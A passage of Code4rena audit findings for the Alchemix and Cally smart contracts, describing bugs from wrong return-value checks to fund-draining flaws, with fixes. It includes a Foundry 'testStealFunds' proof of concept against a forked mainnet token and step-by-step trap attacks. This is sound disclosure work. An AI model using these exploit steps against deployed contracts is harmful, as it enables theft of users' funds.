https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/adapters/fuse/FuseTokenAdapterV1.sol#L98   # Vulnerability details  ## Impact the code is doing wrong check, so when things will work it will revert.   ## Proof of Concept In the function `wrap()` there is this lines: ```    if ((error = ICERC20(token).mint(amount)) != NO_ERROR) {             revert FuseError(error);         } ``` but `mint` returns the amount that minted, so when `error = amount` the check will fail even though it worked good.  Same in `unwrap`: ``` if ((error = ICERC20(token).redeem(amount)) != NO_ERROR) {             revert FuseError(error);         } ``` the redeem returns the amount.   ## Recommended Mitigation Steps  I recommend to change the lines like this:     in wrap:     ```      if ((error = ICERC20(token).mint(amount)) != amount) {             revert FuseError(error);         }     ```     and in unwrap:     ```     if ((error = ICERC20(token).redeem(amount)) != amount) {             revert FuseError(error);         }     ```   "}, {"title": "AutoleverageBase: Must approve 0 first", "html_url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/144", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-alchemix-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageBase.sol#L61-L63   # Vulnerability details  ## Impact Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value.They must first be approved by zero and then the actual allowance must be approved. ## Proof of Concept https://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageBase.sol#L61-L63 https://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageBase.sol#L147-L147 https://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageBase.sol#L178-L179 ## Tools Used None ## Recommended Mitigation Steps ```     function approve(address token, address spender) internal {     +  IERC20(token).approve(spender, 0);         IERC20(token).approve(spender, type(uint256).max);     } ```  "}, {"title": "TransmuterBuffer's setAlchemist will freeze deposited funds", "html_url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/117", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-alchemix-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterBuffer.sol#L230-L248   # Vulnerability details  Currently setAlchemist doesn't check whether there are any open positions left with the old Alchemist before switching to the new one.  As this require a number of checks the probability of operational mistake isn't low and it's prudent to introduce the main controls directly to the code to minimize it. In the case if the system go on with new Alchemist before realizing that there are some funds left in the old one, tedious and error prone manual recovery will be needed. There is also going to be a corresponding reputational damage.  Setting the severity to medium as while the function is admin only, the impact is up to massive user fund freeze, i.e. this is system breaking with external assumptions.  ## Proof of Concept  Alchemist implementation change can happen while there are open deposits remaining with the current contract. As there looks to be no process to transfer them in the code, such TransmuterBuffer's funds will be frozen with old alchemist:  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-hardhat/TransmuterBuffer.sol#L230-L232  ```solidity     function setAlchemist(address _alchemist) external override onlyAdmin {         sources[alchemist] = false;         sources[_alchemist] = true; ```  ## Recommended Mitigation Steps  Consider requiring that all exposure to the old Alchemist is closed, for example both `getAvailableFlow` and `getTotalCredit` is zero.  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterBuffer.sol#L230-L231  ```solidity     function setAlchemist(address _alchemist) external override onlyAdmin { +    require(getTotalCredit() == 0, \"Credit exists with old Alchemist\"); +       for (uint256 j = 0; j < registeredUnderlyings.length; j++) { +           require(getTotalUnderlyingBuffered[registeredUnderlyings[j]] == 0, \"Buffer exists with old Alchemist\"); +       }         sources[alchemist] = false; ```  "}, {"title": "If `totalShares` for a token falls to zero while there is `pendingCredit` the contract will become stuck", "html_url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/104", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-alchemix-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemistV2.sol#L1290-L1300 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemistV2.sol#L1268 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemistV2.sol#L1532 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemistV2.sol#L899 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemistV2.sol#L1625   # Vulnerability details  ## Impact  It is possible for the contract to become stuck and unable to perform any actions if the `totalShares` of a yield token fall to zero while there is some `pendingCredit` still to be paid.  It will then be impossible to call deposit or withdraw functions, mints, burns, repay, liquidate, donate or harvest due to division by zero reverts in:  - `_distributeCredit()` - `_distributeUnlockedCredit()` - `_calculateUnrealizedDebt()` - `_convertSharesToYieldTokens()` - `donate()`  Furthermore, any `pendingCredit` amount of tokens are still in the contract will become permanently stuck.  ## Proof of Concept  This case may arise under the follow steps a) `deposit()` is called by a user then time passes to earn some yield b) `harvest()` is called by the keeper which calls `_distributeCredit()` and increases `pendingCredit` c) `withdraw()` is called by the user to withdraw all funds  Since there is `pendingCredit` the following will have a non-zero balance for `unlockedCredit` however `yieldTokenParams.totalShares` is zero and thus we get a division by zero which reverts the entire transaction.  ```solidity     function _distributeUnlockedCredit(address yieldToken) internal {         YieldTokenParams storage yieldTokenParams = _yieldTokens[yieldToken];           uint256 unlockedCredit = _calculateUnlockedCredit(yieldToken);         if (unlockedCredit == 0) {             return;         }           yieldTokenParams.accruedWeight     += unlockedCredit * FIXED_POINT_SCALAR / yieldTokenParams.totalShares;         yieldTokenParams.distributedCredit += unlockedCredit;     } ```  Each of the other listed functions will reach the same issue by attempting to divide some numerator by the `totalShares` which is zero.  ## Recommended Mitigation Steps  Consider preventing `totalShares` from over becoming zero once it is set. That is enforce a user to leave at least 1 unit if they are the last user to withdraw.  Another option is to transfer the first 1000 shares to a \"burn\" account (e.g. 0x000...01), when the first user deposits.  Alternatively, when the last user withdraws, transfer all pending credit to this user and set the required variables to zero to replicate the state before any users have deposited.  "}, {"title": "YearnTokenAdapter's wrap can become stuck as it uses one step approval for an arbitrary underlying", "html_url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/99", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-alchemix-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/adapters/yearn/YearnTokenAdapter.sol#L30-L32   # Vulnerability details  Some tokens do not allow for approval of positive amount when allowance is positive already (to handle approval race condition, most known example is USDT).  This can cause the function to stuck whenever a combination of such a token and leftover approval be met. The latter can be possible if, for example, yearn vault is becoming full on a particular wrap() call and accepts only a part of amount, not utilizing the approval fully.  Then each next safeApprove will revert and wrap becomes permanently unavailable. Setting the severity to medium as depositing (wrapping) is core functionality for the contract and its availability is affected.  ## Proof of Concept  wrap use one step approve:  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/adapters/yearn/YearnTokenAdapter.sol#L30-L32  ```solidity     function wrap(uint256 amount, address recipient) external override returns (uint256) {         TokenUtils.safeTransferFrom(underlyingToken, msg.sender, address(this), amount);         TokenUtils.safeApprove(underlyingToken, token, amount); ```  Some ERC20 forbid the approval of positive amount when the allowance is positive:  https://github.com/d-xo/weird-erc20#approval-race-protections  For example, USDT is supported by Yearn and can be the underlying asset:  https://yearn.finance/#/vault/0x7Da96a3891Add058AdA2E826306D812C638D87a7  ## Recommended Mitigation Steps  As the most general approach consider approving zero before doing so for the amount:  ```solidity     function wrap(uint256 amount, address recipient) external override returns (uint256) {         TokenUtils.safeTransferFrom(underlyingToken, msg.sender, address(this), amount); +      TokenUtils.safeApprove(underlyingToken, token, 0);         TokenUtils.safeApprove(underlyingToken, token, amount); ```  "}, {"title": "EthAssetManager and ThreePoolAssetManager don't control Meta tokens decimals", "html_url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/63", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-alchemix-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/ThreePoolAssetManager.sol#L896-L905 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/EthAssetManager.sol#L566-L573   # Vulnerability details  Both contracts treat meta assets as if they have fixed decimals of 18. Minting logic breaks when it's not the case. However, meta tokens decimals aren't controlled.  If actual meta assets have any other decimals, minting slippage control logic of both contracts will break up as `total` is calculated as a plain sum of token amounts.  In the higher token decimals case `minTotalAmount` will be magnitudes higher than actual amount Curve can provide and minting becomes unavailable.  In the lower token decimals case `minTotalAmount` will lack value and slippage control will be rendered void, which opens up a possibility of a fund loss from the excess slippage.  Setting severity to medium as the contract can be used with various meta tokens (`_metaPoolAssetCache`  can be filled with any assets) and, whenever decimals differ from 18 `add_liquidity` uses, its logic be broken: the inability to mint violates the contract purpose, the lack of slippage control can lead to fund losses.  I.e. this is system breaking impact conditional on a low probability assumption of different meta token decimals.  ## Proof of Concept  Meta tokens decimals are de facto hard coded into the contract as plain amounts are used (L. 905):  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/ThreePoolAssetManager.sol#L896-L905  ```solidity     function _mintMetaPoolTokens(         uint256[NUM_META_COINS] calldata amounts     ) internal returns (uint256 minted) {         IERC20[NUM_META_COINS] memory tokens = _metaPoolAssetCache;          uint256 total = 0;         for (uint256 i = 0; i < NUM_META_COINS; i++) {             if (amounts[i] == 0) continue;              total += amounts[i]; ```  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/ThreePoolAssetManager.sol#L915-L919  ```solidity         uint256 expectedOutput    = total * CURVE_PRECISION / metaPool.get_virtual_price();         uint256 minimumMintAmount = expectedOutput * metaPoolSlippage / SLIPPAGE_PRECISION;          // Add the liquidity to the pool.         minted = metaPool.add_liquidity(amounts, minimumMintAmount); ```  The same plain sum approach is used in EthAssetManager._mintMetaPoolTokens:  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/EthAssetManager.sol#L566-L573  ```solidity         uint256 total = 0;         for (uint256 i = 0; i < NUM_META_COINS; i++) {             // Skip over approving WETH since we are directly swapping ETH.             if (i == uint256(MetaPoolAsset.ETH)) continue;              if (amounts[i] == 0) continue;              total += amounts[i]; ```  When this decimals assumption doesn't hold, the slippage logic will not hold too: either the mint be blocked or slippage control disabled.  Notice, that ThreePoolAssetManager.calculateRebalance do query alUSD decimals (which is inconsistent with the above as it\u2019s either fix and control on inception or do not fix and accommodate the logic):  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/ThreePoolAssetManager.sol#L338-L338  ```solidity decimals     = SafeERC20.expectDecimals(address(alUSD)); ```  ## Recommended Mitigation Steps  If meta assets are always supposed to have fixed decimals of 18, consider controlling it at the construction time.  I.e. the decimals can be controlled in constructors:  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/EthAssetManager.sol#L214-L219  ```solidity         for (uint256 i = 0; i < NUM_META_COINS; i++) {             _metaPoolAssetCache[i] = params.metaPool.coins(i);             if (_metaPoolAssetCache[i] == IERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)) {                 _metaPoolAssetCache[i] = weth; +           } else { +            // check the decimals     }         } ```  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/ThreePoolAssetManager.sol#L254-L256  ```solidity         for (uint256 i = 0; i < NUM_META_COINS; i++) {             _metaPoolAssetCache[i] = params.metaPool.coins(i); +           // check the decimals                     } ```  In this case further decimals reading as it's done in calculateRebalance() is redundant.  Otherwise (which is less recommended as fixed decimals assumption is viable and simplify the logic) the meta token decimals can be added to calculations similarly to stables:  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/ThreePoolAssetManager.sol#L779-L779  ```solidity normalizedTotal += amounts[i] * 10**missingDecimals; ```  "}, {"title": "No Storage Gap for Upgradeable Contract Might Lead to Storage Slot Collision", "html_url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/44", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-alchemix-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemicTokenV2Base.sol#L20 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/CrossChainCanonicalBase.sol#L12 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterV2.sol#L26 https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/CrossChainCanonicalAlchemicTokenV2.sol#L7   # Vulnerability details  ## Impact  For upgradeable contracts, there must be storage gap to \"allow developers to freely add new state variables in the future without compromising the storage compatibility with existing deployments\" (quote OpenZeppelin). Otherwise it may be very difficult to write new implementation code. Without storage gap, the variable in child contract might be overwritten by the upgraded base contract if new variables are added to the base contract. This could have unintended and very serious consequences to the child contracts, potentially causing loss of user fund or cause the contract to malfunction completely.  Refer to the bottom part of this article: https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable   ## Proof of Concept  Several contracts are intended to be upgradeable contracts in the code base, including  - AlchemicTokenV2Base - CrossChainCanonicalBase - CrossChainCanonicalAlchemicTokenV2 - TransmuterV2  However, none of these contracts contain storage gap. The storage gap is essential for upgradeable contract because \"It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments\". Refer to the bottom part of this article:  https://docs.openzeppelin.com/contracts/3.x/upgradeable  As an example, both the `AlchemicTokenV2Base` and the `CrossChainCanonicalBase` are intended to act as the base contracts in the project. If the contract inheriting the base contract contains additional variable, then the base contract cannot be upgraded to include any additional variable, because it would overwrite the variable declared in its child contract. This greatly limits contract upgradeability.    ## Tools Used  Manual review  ## Recommended Mitigation Steps  Recommend adding appropriate storage gap at the end of upgradeable contracts such as the below. Please reference OpenZeppelin upgradeable contract templates.  ```solidity uint256[50] private __gap; ```  "}, {"title": "[WP-H0] Fake balances can be created for not-yet-existing ERC20 tokens, which allows attackers to set traps to steal funds from future users", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/225", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L158-L201   # Vulnerability details  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L158-L201  ```solidity function createVault(     uint256 tokenIdOrAmount,     address token,     ... ) external returns (uint256 vaultId) {     ...     Vault memory vault = Vault({         ...     });      // vault index should always be odd     vaultIndex += 2;     vaultId = vaultIndex;     _vaults[vaultId] = vault;      // give msg.sender vault token     _mint(msg.sender, vaultId);      emit NewVault(vaultId, msg.sender, token);      // transfer the NFTs or ERC20s to the contract     vault.tokenType == TokenType.ERC721         ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)         : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount); } ```  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L23-L34  ```solidity import \"solmate/utils/SafeTransferLib.sol\";  ...  contract Cally is CallyNft, ReentrancyGuard, Ownable {     using SafeTransferLib for ERC20;     ... ```  When creating a new vault, solmate's `SafeTransferLib` is used for pulling `vault.token` from the caller's account, this issue won't exist if OpenZeppelin's SafeERC20 is used instead.  That's because there is a subtle difference between the implementation of solmate's `SafeTransferLib` and OZ's `SafeERC20`:  OZ's `SafeERC20` checks if the token is a contract or not, solmate's `SafeTransferLib` does not.  See: https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9  > Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.  As a result, when the token's address has no code, the transaction will just succeed with no error.  This attack vector was made well-known by the qBridge hack back in Jan 2022.  For our project, this alone still won't be a problem, a vault created and wrongfully accounted for a certain amount of balance for a non-existing token won't be much of a problem, there will be no fund loss as long as the token stays that way (being non-existing).  However, it's becoming popular for protocols to deploy their token across multiple networks and when they do so, a common practice is to deploy the token contract from the same deployer address and with the same nonce so that the token address can be the same for all the networks.  For example: $1INCH is using the same token address for both Ethereum and BSC; Gelato's $GEL token is using the same token address for Ethereum, Fantom and Polygon.  A sophisticated attacker can exploit it by taking advantage of that and setting traps on multiple potential tokens to steal from the future users that deposits with such tokens.  ### PoC  Given:  - ProjectA has TokenA on another network; - ProjectB has TokenB on another network; - ProjectC has TokenC on another network;  1. The attacker `createVault()` for `TokenA`, `TokenB`, and `TokenC` with `10000e18` as `tokenIdOrAmount` each; 2. A few months later, ProjectB lunched `TokenB` on the local network at the same address; 3. Alice created a vault with `11000e18 TokenB`; 4. The attacker called `initiateWithdraw()` and then `withdraw()` to receive `10000e18 TokenB`.  In summary, one of the traps set by the attacker was activated by the deployment of  `TokenB` and Alice was the victim. As a result, `10000e18 TokenB` was stolen by the attacker.  ### Recommendation  Consider using OZ's `SafeERC20` instead.  "}, {"title": "It shouldn\u2019t be possible to create a vault with Cally\u2019 own token", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/224", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L193 https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L199   # Vulnerability details  ## Impact  Affected code:  - [https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L193](https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L193) - [https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L199](https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L199)  Currently it\u2019s possible to create an ERC-721 vault using Cally\u2019 own address as `token`, and using the freshly minted vault id as `tokenIdOrAmount`. This results in a new vault whose ownership is passed to Cally contract immediately upon creation.  The vault allows users to perform `buyOption` and increase the ETH balance of the Cally contract itself, which is still the vault beneficiary. As soon as an user calls `exercise`, she will receive the `vault.tokenIdOrAmount` in exchange, which in this case coincides with the vault nft. However this is of no good because the final user may just initiate a withdrawal, which will:  - always fail because the vault id is burned ([https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L335](https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L335)) and then transferred back to the user ([https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L344](https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L344)) - leave all the ETH unredemable in Cally contract  So the vault will be unusable and the ETH deposited by users to buy/exercise options will remain locked in Cally contract  ## Proof of Concept  - Current vault id is, let\u2019s say, 11 - User deploys a vault with Cally\u2019 address as `token` and `13` as `tokenIdOrAmount` - Since `createVault()` mints the vault token to the user, and then transfers the underlying address from the user, an user is able to create a vault with something she doesn\u2019t own at the moment of the `createVault()` function call, because it\u2019s created while the function runs - The vault `13` is pretty limited in functionality, because Cally\u2019 smart contract is the owner - However, users can still buy options: so Alice and Bob deposit their premiums - Whoever `exercise` the active option, becomes the vault owner now; this is of no good because no one can actually call `withdraw()` as it will always revert, and no one can recover the ETH deposited by Alice and Bob as they are locked forever  ## Tools Used  Editor  ## Recommended Mitigation Steps  Add the following check at the start of `createVault()`:  ```jsx require(token != address(this), \"Cant use Cally as token\"); ```  "}, {"title": "Inefficiency in the Dutch Auction due to lower duration", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/138", "labels": ["bug", "3 (High Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L406-L423   # Vulnerability details   The vulnerability or bug is in the implementation of the function getDutchAuctionStrike() The AUCTION_DURATION is defined as 24 hours, and consider that the dutchAuctionReserveStrike (or reserveStrike) will never be set to 0 by user.  Now if a vault is created with startingStrike value of 55 and reserveStrike of 13.5 , the auction price will drop from 55 to 13.5 midway at ~12 hours. So, after 12 hours from start of auction, the rate will be constant at reserveStrike of 13.5, and remaining time of 12 hours of auction is a waste.   Some other examples : ``` startStrike, reserveStrike, time-to-reach-reserveStrike 55 , 13.5  , ~12 hours 55 , 5     , ~16.7 hours 55 , 1.5   , ~20 hours 5  , 1.5   , ~11 hours ``` ## Impact The impact is high wrt Usability, where users have reduced available time to participate in the auction (when price is expected to change). The vault-Creators or the option-Buyers may or may not be aware of this inefficiency, i.e., how much effective time is available for auction.  ## Proof of Concept Contract : Cally.sol Function : getDutchAuctionStrike ()  ## Recommended Mitigation Steps The function getDutchAuctionStrike() can be modified such that price drops to the reserveStrike exactly at 24 hours from start of auction. ```         /*             delta = max(auctionEnd - currentTimestamp, 0)             progress = delta / auctionDuration             auctionStrike = progress^2 * (startingStrike - reserveStrike)             << Changes here             strike = auctionStrike + reserveStrike                                    << Changes here         */         uint256 delta = auctionEndTimestamp > block.timestamp ? auctionEndTimestamp - block.timestamp : 0;         uint256 progress = (1e18 * delta) / AUCTION_DURATION;         uint256 auctionStrike = (progress * progress * (startingStrike-reserveStrike)) / (1e18 * 1e18);          strike = auctionStrike + reserveStrike; ```   "}, {"title": "Lack of 0 amount check allows malicious user to create infinite vaults", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/91", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L200   # Vulnerability details  ## Impact A griefer is able to create as many vaults as they want by simply calling `createVault()` with `tokenIdOrAmount = 0`. This will most likely pose problems on the front-end of the Cally protocol because there will be a ridiculously high number of malicious vaults displayed to actual users.  I define these vaults as malicious because it is possible that a user accidently buys a call on this vault which provides 0 value in return. Overall, the presence of zero-amount vaults is damaging to Cally's product image and functionality.  ## Proof of Concept - User calls `createVault(0,,,,);` with an ERC20 type. - There is no validation that `amount > 0` - Function will complete successfully, granting the new vault NFT to the caller. - Cally protocol is filled with unwanted 0 amount vaults.  ## Tools Used Manual review  ## Recommended Mitigation Steps Add the simple check `require(tokenIdOrAmount > 0, \"Amount must be greater than 0\");`  "}, {"title": "no-revert-on-transfer ERC20 tokens can be drained", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/89", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code\r \r https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L198-L200\r \r \r # Vulnerability details\r \r ## Impact\r Some ERC20 tokens don't throw but just return false when a transfer fails. This can be abused to trick the `createVault()` function to initialize the vault without providing any tokens. A good example of such a token is *ZRX*: [Etherscan code](https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498#code#L64)\r \r When such a vault is initialized, another user can both buy and exercise the option without ever receiving any funds. The creator of the vault does receive the buyer's Ether tho. So it can cause a loss of funds.\r \r ## Proof of Concept\r The trick is to create a vault with an ERC20 token but use ERC721 as the vault's type. Then, instead of calling `safeTransferFrom()` the function calls `transferFrom()` which won't catch the token returning false.\r \r Here's a test that showcases the issue:\r \r ```solidity\r // CreateVault.t.sol\r     function testStealFunds() public {\r         // address of 0x on mainnet\r         address t = address(0xE41d2489571d322189246DaFA5ebDe1F4699F498);\r         vm.startPrank(babe);\r         require(ERC20(t).balanceOf(babe) == 0);\r         uint vaultId = c.createVault(100, t, 1, 1, 1, 0, Cally.TokenType.ERC721);\r         // check that neither the Cally contract nor the vault creator\r         // had any 0x tokens\r         require(ERC20(t).balanceOf(babe) == 0);\r         require(ERC20(t).balanceOf(address(c)) == 0);\r \r         // check whether vault was created properly\r         Cally.Vault memory v = c.vaults(vaultId);\r         require(v.token == t);\r         require(v.tokenIdOrAmount == 100);\r         vm.stopPrank();\r         // So now there's a vault for 100 0x tokens although the Cally contract doesn't\r         // have any.\r         // If someone buys & exercises the option they won't receive any tokens.\r         uint premium = 0.025 ether;\r         uint strike = 2 ether;\r         require(address(c).balance == 0, \"shouldn't have any balance at the beginning\");\r         require(payable(address(this)).balance > 0, \"not enough balance\");\r \r         uint optionId = c.buyOption{value: premium}(vaultId);\r         c.exercise{value: strike}(optionId);\r \r         // buyer of option (`address(this)`) got zero 0x tokens\r         // But buyer lost their Ether\r         require(ERC20(t).balanceOf(address(this)) == 0);\r         require(address(c).balance > 0, \"got some money\");\r     }\r ```\r \r To run it, you need to use forge's forking mode: `forge test --fork-url <alchemy/infura URL> --match testStealFunds`\r \r ## Tools Used\r none\r \r ## Recommended Mitigation Steps\r I think the easiest solution is to use `safeTransferFrom()` when the token is of type ERC721. Since the transfer is at the end of the function there shouldn't be any risk of reentrancy. If someone passes an ERC20 address with type ERC721, the `safeTransferFrom()` call would simply fail since that function signature shouldn't exist on ERC20 tokens.\r \r "}, {"title": "User's may accidentally overpay in `buyOption()` and the excess will be paid to the vault creator", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/84", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L223-L224   # Vulnerability details  ## Impact  It is possible for a user purchasing an option to accidentally overpay the premium during `buyOption()`.  Any excess funds paid for in excess of the premium will be transferred to the vault creator.  The premium is fixed at the time the vault is first created by `vault.premiumIndex`. Hence there is no need to allow users to overpay since there will be no benefit.   ## Proof of Concept  `buyOption()` allows `msg.value > premium`  ```solidity         uint256 premium = getPremium(vaultId);         require(msg.value >= premium, \"Incorrect ETH amount sent\"); ```  ## Recommended Mitigation Steps  Consider modifying the check such that the `msg.value` is exactly equal to the `premuim`. e.g.  ```solidity         uint256 premium = getPremium(vaultId);         require(msg.value == premium, \"Incorrect ETH amount sent\"); ```  "}, {"title": "Vault is Not Compatible with Fee Tokens and Vaults with Such Tokens Could Be Exploited", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/61", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L198-L200 https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L294-L296 https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L343-L345   # Vulnerability details  ## Impact  Some ERC20 tokens charge a transaction fee for every transfer (used to encourage staking, add to liquidity pool, pay a fee to contract owner, etc.). If any such token is used in the `createVault()` function, either the token cannot be withdrawn from the contract (due to insufficient token balance), or it could be exploited by other such token holders and the `Cally` contract would lose economic value and some users would be unable to withdraw the underlying asset.    ## Proof of Concept  Plenty of ERC20 tokens charge a fee for every transfer (e.g. Safemoon and its forks), in which the amount of token received is less than the amount being sent. When a fee token is used as the `token` in the `createVault()` function, the amount received by the contract would be less than the amount being sent. To be more precise, the increase in the `cally` contract token balance would be less than `vault.tokenIdOrAmount` for such ERC20 token because of the fee.   ```         vault.tokenType == TokenType.ERC721             ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)             : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount); ```  The implication is that both the `exercise()` function and the `withdraw()` function are guaranteed to revert if there's no other vault in the contract that contains the same fee tokens, due to insufficient token balance in the `Cally` contract.   When an attacker observes that a vault is being created that contains such fee tokens, the attacker could create a new vault himself that contains the same token, and then withdraw the same amount. Essentially the `Cally` contract would be paying the transfer fee for the attacker because of how the token amount is recorded. This causes loss of user fund and loss of value from the `Cally` contract. It would make economic sense for the attacker when the fee charged by the token accrue to the attacker. The attacker would essentially use the `Cally` contract as a conduit to generate fee income.    ## Tools Used  Manual review  ## Recommended Mitigation Steps  Recommend disallowing fee tokens from being used in the vault. This can be done by adding a `require()` statement to check that the amount increase of the `token` balance in the `Cally` contract is equal to the amount being sent by the caller of the `createVault()` function.   "}, {"title": "Owner can set the feeRate to be greater than 100% and cause all future calls to `exercise` to revert", "html_url": 